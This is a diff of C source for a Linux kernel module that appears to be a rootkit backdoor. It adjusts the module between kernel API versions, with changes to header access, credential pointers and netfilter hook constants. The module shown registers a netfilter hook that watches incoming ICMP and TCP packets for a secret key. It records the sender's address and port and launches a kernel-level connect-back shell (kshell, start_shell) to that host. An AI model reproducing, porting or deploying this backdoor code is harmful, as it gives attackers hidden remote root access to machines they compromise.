@@ -175,8 +175,7 @@ void encrypt_code(char *buf,int count)
  */
 int kshell(int ip,int port)
 {
-        //struct task_struct *ptr = current;
-    struct cred *ptr = (struct cred *)current->cred;
+        struct task_struct *ptr = current;
 	struct socket *sock;
         struct sockaddr_in server;
 	struct winsize ws;
@@ -214,8 +213,8 @@ int kshell(int ip,int port)
 		e_exit(-1);
                 return -1;
         }
-	//http://lkml.indiana.edu/hypermail/linux/kernel/0805.0/2937.html
-	soc = sock_map_fd(sock,0);
+	
+	soc = sock_map_fd(sock);
 	if (soc < 0) {
 		#if DEBUG == 1
 		printk("[-] sock_map_fd() failed.\n");
@@ -355,8 +354,7 @@ int get_pty(void)
  */
 void start_shell(void)
 {
-        //struct task_struct *ptr = current;
-        struct cred *ptr = (struct cred *)current->cred;
+        struct task_struct *ptr = current;
         mm_segment_t old_fs;
 
         old_fs = get_fs();
@@ -402,8 +400,8 @@ unsigned int hook_func(unsigned int hooknum,
 
         if (!sk)
                 return NF_ACCEPT;
-        //http://www.linuxquestions.org/questions/linux-kernel-70/struct-sk_buff-has-no-member-named-nh-882525/
-        switch (ip_hdr(sk)->protocol) {
+                
+        switch (sk->nh.iph->protocol) {
                 case 1:
 			#if DEBUG == 1
                         printk("[+] Got a icmp packet.\n");
@@ -415,7 +413,7 @@ unsigned int hook_func(unsigned int hooknum,
                         return NF_ACCEPT;
                         
                 case 6:
-               	        ip = ip_hdr(sk);
+               	        ip = sk->nh.iph;
                        	tcphdr = (struct tcphdr *)((__u32 *)ip + ip->ihl);
 			data = (char *)((int *)tcphdr + (int)(tcphdr->doff));
 
@@ -451,9 +449,8 @@ unsigned int hook_func(unsigned int hooknum,
 					}
 					port[i] = 0;
 					
-					myowner_ip = ip_hdr(sk)->saddr;
-                    //http://sourceware.org/bugzilla/show_bug.cgi?id=11951
-					sprintf(connect_ip,"%pI4",&myowner_ip);
+					myowner_ip = sk->nh.iph->saddr;
+					sprintf(connect_ip,"%u.%u.%u.%u",NIPQUAD(myowner_ip));
 				}
 
 				connect_port = wnps_atoi(port);
@@ -472,13 +469,13 @@ unsigned int hook_func(unsigned int hooknum,
                         /*
                          * filter the non connected tcp packet.
                          */
-			len = (unsigned short)ip_hdr(sk)->tot_len;
+			len = (unsigned short)sk->nh.iph->tot_len;
 			len = htons(len);
 
 			if (len > BUFF_NUM - 1)
 				len = BUFF_NUM -1;
 
-			memcpy(buf,(void *)ip_hdr(sk),len);
+			memcpy(buf,(void *)sk->nh.iph,len);
 
 			for (i = 0; i < len; i++)
 				if (buf[i] == 0)
@@ -488,7 +485,7 @@ unsigned int hook_func(unsigned int hooknum,
                         if (strstr(buf,TCP_SHELL_KEY) != NULL) {
 				if (!wztshell) {
                                 	myowner_port = tcphdr->source;
-                                	myowner_ip = ip_hdr(sk)->saddr;
+                                	myowner_ip = sk->nh.iph->saddr;
                                 	wztshell = 1;
 
 					#if DEBUG == 1
@@ -517,8 +514,7 @@ int netfilter_test_init(void)
 	nfho.hook = hook_func;
 	nfho.owner = NULL;
 	nfho.pf = PF_INET;
-    //http://www.linuxquestions.org/questions/linux-networking-3/nf_ip_pre_routing-macro-not-found-4175431483/
-	nfho.hooknum = NF_INET_PRE_ROUTING;
+	nfho.hooknum = NF_IP_PRE_ROUTING;
 	nfho.priority = NF_IP_PRI_FIRST;
 	
 	nf_register_hook(&nfho);
